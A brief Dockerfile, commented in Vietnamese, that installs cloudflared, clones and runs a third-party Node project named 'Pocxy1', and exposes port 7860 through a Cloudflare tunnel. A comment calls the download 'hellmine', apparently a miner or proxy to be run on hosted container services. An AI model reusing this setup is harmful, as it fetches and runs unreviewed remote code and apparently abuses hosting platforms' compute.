FROM ubuntu:latest

# Cập nhật hệ thống và cài đặt các gói cần thiết
RUN apt update && apt upgrade -y && apt-get update && apt-get install -y htop \
    curl \
    ca-certificates \
    git \
    sudo \ 
    unzip \
    python3 \
    nodejs \
    npm \
    wget 
    

# Tạo thư mục làm việc và tải hellmine

RUN wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb && apt install ./cloudflared-linux-amd64.deb && git clone https://github.com/Teo4268/Pocxy1.git && cd Pocxy1 && npm install && node index.js & cloudflared tunnel --url localhost:7860
